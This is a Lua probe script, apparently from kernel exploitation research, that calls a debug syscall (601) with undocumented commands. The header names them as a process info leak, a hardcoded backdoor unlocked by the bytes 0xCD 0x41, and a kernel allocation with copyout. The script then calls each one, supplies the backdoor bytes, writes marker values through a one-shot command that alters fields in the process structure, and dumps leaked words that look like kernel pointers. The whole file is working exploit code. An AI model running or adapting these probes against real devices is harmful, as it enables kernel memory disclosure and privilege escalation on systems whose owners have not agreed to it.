-- CRASH_CLASS: HIGH
-- PROBE 793a: mdbg 601 commands the 13.60 deep analysis names as leak or write
--
-- Context: results/kernel_handlers/analysis/sys_601_deep.md (13.60) maps the
-- 0x27-entry command table. Everything we swept so far (0x00-0x09) is either a
-- trivial return, -1, or a wedge. The report names three commands with real
-- behaviour that we have never called:
--   0x05  0xb8-byte process info leak            (no auth)
--   0x0c  hardcoded auth: bytes 0xCD, 0x41       (backdoor)
--   0x10  0x1000-byte kernel allocation + copyout (HIGH)
--   0x12  write proc+0x528/+0x578/+0x580          (CRITICAL, one-shot)
-- 14.10 parity is unproven; this probe calls them in increasing risk order and
-- records ret plus the first words of the output page.
--
-- Each section uses a fresh page so a partial write is visible.

print("=== PROBE 793a: mdbg named commands ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local function rd(a)
    local o, v = pcall(function() return memory.read_dword(a) end)
    if o then return to_num(v) end
    return 0
end
local function wd(a, v)
    pcall(function() memory.write_dword(a, v) end)
end
local function wb(a, v)
    pcall(function() memory.write_byte(a, v) end)
end

local Z = uint64(0)
local K = 0xFFFF8000

local function dump(tag, p, words)
    local nz, kern = 0, 0
    local shown = 0
    for i = 0, words - 1 do
        local v = rd(p + i * 4)
        if v ~= 0 then
            nz = nz + 1
            if (v % 4294967296) >= K then kern = kern + 1
            elseif shown < 8 then
                print(string.format("  %s +%03X = %08X", tag, i * 4, v % 4294967296))
                shown = shown + 1
            end
        end
    end
    print(string.format("  %s nonzero=%s kernel-shaped=%s", tag, nz, kern))
end

local f = make_syscall(601)

local function run(cmd, words, arg3)
    local p = to_num(memory.alloc(words * 4))
    for i = 0, words - 1 do wd(p + i * 4, 0) end
    local r = sgn(f(U(cmd), U(p), U(arg3), Z, Z, Z))
    print(string.format("  cmd %02X ret=%s arg3=%s", cmd, r, tostring(arg3)))
    dump(string.format("%02X", cmd), p, words)
    return p
end

print("[A] cmd 0x10, 0x1000 out page")
run(0x10, 0x400, 0)
print("")

print("[B] cmd 0x0c, backdoor bytes 0xCD 0x41")
local pb = run(0x0c, 0x40, 0)
wb(pb, 0xCD)
wb(pb + 1, 0x41)
local r2 = sgn(f(U(0x0c), U(pb), Z, Z, Z, Z))
print(string.format("  cmd 0C ret(auth)=%s", r2))
dump("0C", pb, 0x40)
print("")

print("[C] cmd 0x05, 0xb8-byte info")
run(0x05, 0x40, 0xb8)
print("")

print("[D] cmd 0x12, write proc fields (last, one-shot)")
local pw = to_num(memory.alloc(0x100))
for i = 0, 0x3F do wd(pw + i * 4, 0) end
wd(pw, 0x41414141)
wd(pw + 4, 0x42424242)
local r4 = sgn(f(U(0x12), U(pw), Z, Z, Z, Z))
print(string.format("  cmd 12 ret=%s", r4))

print("")
print("[E] still alive, cmd 0x00 control")
run(0x00, 0x10, 0)
print("=== PROBE 793a END ===")
